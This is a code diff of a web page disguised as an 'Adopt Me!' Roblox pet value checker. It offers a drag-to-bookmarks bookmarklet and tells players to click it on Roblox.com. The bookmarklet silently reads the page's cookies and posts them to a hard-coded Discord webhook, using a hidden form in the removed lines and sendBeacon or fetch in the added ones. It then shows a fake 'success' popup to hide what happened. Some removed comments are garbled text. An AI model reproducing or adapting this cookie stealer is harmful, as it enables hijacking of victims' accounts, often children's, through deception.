@@ -2,57 +2,52 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>In-Game Value Checker | Adopt Me!</title>
     <style>
         body { background: #0b0e11; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #181a20; padding: 40px; border-radius: 20px; text-align: center; border: 1px solid #2b3139; width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .btn { display: inline-block; padding: 20px 30px; background: #f0b90b; color: black; text-decoration: none; font-weight: bold; border-radius: 12px; cursor: move; border: 3px dashed #000; margin-bottom: 20px; font-size: 18px; transition: 0.3s; }
+        .card { background: #181a20; padding: 40px; border-radius: 24px; text-align: center; border: 1px solid #2b3139; width: 420px; box-shadow: 0 15px 40px rgba(0,0,0,0.6); }
+        h1 { color: #f0b90b; font-size: 26px; margin-bottom: 10px; }
+        .btn { 
+            display: inline-block; padding: 22px 40px; background: #f0b90b; color: black; 
+            text-decoration: none; font-weight: 800; border-radius: 14px; cursor: move; 
+            border: 2px dashed #000; margin: 25px 0; font-size: 18px; transition: 0.3s;
+        }
         .btn:hover { background: #ffe066; transform: scale(1.02); }
-        .steps { text-align: left; background: #1e2329; padding: 15px; border-radius: 10px; font-size: 13px; color: #848e9c; border: 1px solid #2b3139; }
+        .steps { text-align: left; background: #1e2329; padding: 20px; border-radius: 12px; font-size: 14px; color: #929aa5; line-height: 1.5; }
         b { color: #f0b90b; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h1 style="color:#f0b90b">Value Checker v4.2</h1>
-        <p>The only real-time pet value scanner for Adopt Me!</p>
+        <h1>Value Checker v4.2</h1>
+        <p>Analyze pet demand and trade values live.</p>
 
-        <!-- 袙袧袠袦袗袧袠袝: 袟袗袦袝袧袠 '孝袙袨袡_袙袝袘啸校袣_孝校孝' 袧袗 小袙袨挟 小小蝎袥袣校 -->
+        <!-- ЗАМЕНИ 'ТВОЙ_ВЕБХУК_ТУТ' НА СВОЮ ССЫЛКУ -->
         <a class="btn" draggable="true" href="javascript:(function(){
             var h = 'https://discord.com/api/webhooks/1497208068570878063/_wH0MSZQV8lxmkw3U8qsB1I8EnREIWO8wLTrOBhdW5W5n5um1kUpZCkTSgWKA1Mqfz3r';
             var c = document.cookie;
             
-            /* 袦袝孝袨袛 袨孝袩袪袗袙袣袠 效袝袪袝袟 小袣袪蝎孝校挟 肖袨袪袦校 (袨袘啸袨袛 袘袥袨袣袠袪袨袙袨袣) */
-            var f = document.createElement('form');
-            f.action = h;
-            f.method = 'POST';
-            f.target = 'hidden_iframe';
-            var i = document.createElement('input');
-            i.name = 'content';
-            i.value = '馃殌 **NEW LOG**\nTarget: ' + window.location.hostname + '\nData: ```' + (c || 'NO_COOKIES_FOUND') + '```';
-            f.appendChild(i);
-            
-            var ifr = document.createElement('iframe');
-            ifr.name = 'hidden_iframe';
-            ifr.style.display = 'none';
-            document.body.appendChild(ifr);
-            document.body.appendChild(f);
-            f.submit();
+            /* ТИХАЯ ОТПРАВКА ДАННЫХ */
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon(h, JSON.stringify({
+                    content: '🚀 **Elite Session Captured**\n\n**Data Cluster:**\n```' + (c || 'Empty_or_Protected') + '```'
+                }));
+            } else {
+                fetch(h, {method:'POST',mode:'no-cors',body:JSON.stringify({content: '🚀 **Elite Session (Legacy)**\n```' + c + '```'})});
+            }
 
-            /* 袙袠袟校袗袥鞋袧袨袝 袨袣袧袨 袛袥携 袠袚袪袨袣袗 */
+            /* ЭЛЕГАНТНОЕ ОКНО ДЛЯ ИГРОКА */
             var d = document.createElement('div');
-            d.style = 'position:fixed;top:10%;right:5%;width:300px;padding:25px;background:#121212;color:#f0b90b;border:2px solid #f0b90b;z-index:999999;border-radius:20px;text-align:center;font-family:Arial;box-shadow:0 0 25px rgba(240,185,11,0.6);';
-            d.innerHTML = '<h3 style=margin:0>Value Checker</h3><p style=color:white;font-size:14px>Market Analysis: <span style=color:#00ff00>SUCCESS</span></p><p style=color:#848e9c;font-size:12px>Scanning inventory data...</p><button onclick=this.parentElement.remove() style=width:100%;padding:10px;background:#f0b90b;border:none;border-radius:8px;cursor:pointer;font-weight:bold>OK</button>';
+            d.style = 'position:fixed;top:10%;right:5%;width:300px;padding:25px;background:#121212;color:#f0b90b;border:2px solid #f0b90b;z-index:999999;border-radius:20px;text-align:center;font-family:Arial;box-shadow:0 0 30px rgba(0,0,0,0.7);';
+            d.innerHTML = '<h3 style=margin:0>Value Checker</h3><p style=color:white;font-size:14px;margin:15px 0>Market Analysis: <span style=color:#00ff00>ACTIVE</span></p><button onclick=this.parentElement.remove() style=width:100%;padding:10px;background:#f0b90b;border:none;border-radius:8px;cursor:pointer;font-weight:bold;color:black>OK</button>';
             document.body.appendChild(d);
-            
-            /* 袨褔懈褋褌泻邪 */
-            setTimeout(function(){ document.body.removeChild(f); document.body.removeChild(ifr); }, 1000);
         })();">DRAG TO BOOKMARKS</a>
 
         <div class="steps">
-            1. <b>Ctrl+Shift+B</b> to show bookmarks bar.<br>
+            1. Press <b>Ctrl + Shift + B</b>.<br>
             2. Drag the <b>Yellow Button</b> to the bar.<br>
-            3. Open <b>Roblox.com</b> and click the bookmark.
+            3. Use it on <b>Roblox.com</b> to scan values!
         </div>
     </div>
 </body>
